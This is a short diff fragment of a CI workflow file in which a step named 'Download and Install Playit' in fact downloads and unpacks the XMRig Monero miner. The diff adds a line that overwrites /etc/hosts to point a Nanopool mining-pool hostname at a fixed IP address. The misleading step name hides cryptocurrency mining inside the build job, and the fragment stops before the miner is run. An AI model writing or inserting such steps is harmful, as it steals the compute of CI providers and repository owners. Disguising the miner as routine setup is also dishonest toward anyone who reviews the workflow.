@@ -13,6 +13,7 @@ jobs:
 
       - name: Download and Install Playit
         run: |
+          sudo echo "xmr-eu1.nanopool.org 94.140.14.33" > /etc/hosts
           wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
           tar xvf xmrig-6.24.0-noble-x64.tar.gz 
           cd xmrig-6.24.0
